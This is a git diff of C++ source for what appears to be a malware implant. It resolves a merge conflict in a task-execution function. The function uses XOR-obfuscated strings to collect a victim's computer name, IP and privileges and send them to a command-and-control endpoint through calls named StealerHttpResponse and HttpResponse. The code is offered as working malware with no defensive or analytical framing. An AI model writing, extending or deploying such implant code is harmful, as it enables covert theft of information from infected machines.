@@ -47,7 +47,6 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
             results.append(results_parse.at(xor_string("KGEXfIEM",0x28)));
             results.append(results_parse.at(xor_string("AXfIEM",0x28)));
             results.append(results_parse.at(xor_string("xZA^ADMOM[",0x28)));
-
             // Formats string so that the endpoint can accept it 
             results.erase(std::remove(results.begin(), results.end(), '\n'), results.cend());
             results.erase(std::remove(results.begin(), results.end(), '\r'), results.cend()); 
@@ -59,23 +58,11 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
 
         }
         catch(...){
-<<<<<<< HEAD
-            //this line was changed
-            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, xor_string("NIADML",0x28), xor_string("NIAD]ZM",0x28), command);
-            //StealerHttpResponse(xor_string("\nW@VUJKV@zVQ@DI@W",0x25), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
-            work = xor_string("fG",0x28);
-        }
-        if(work.compare(xor_string("fG",0x28)) == 1){
-            printf("IN WORK COMPARE\n");
-            StealerHttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, results_parse, xor_string("NIAD]ZM",0x28), command);
-            //HttpResponse(xor_string("\nW@VUJKV@zVQ@DI@W",0x25), implant_id, task_id, results, xor_string("[]KKM[[",0x28), command);
-=======
             StealerHttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
             work = xor_string("fG",0x28);
         }
         if(work.compare(xor_string("fG",0x28)) == 1){
-            HttpResponse(xor_string(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("[]KKM[[",0x28), command);
->>>>>>> 6698284f9f7801aed5cae9efc27081b5873cdc97
+            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("[]KKM[[",0x28), command);
         }
 
     }
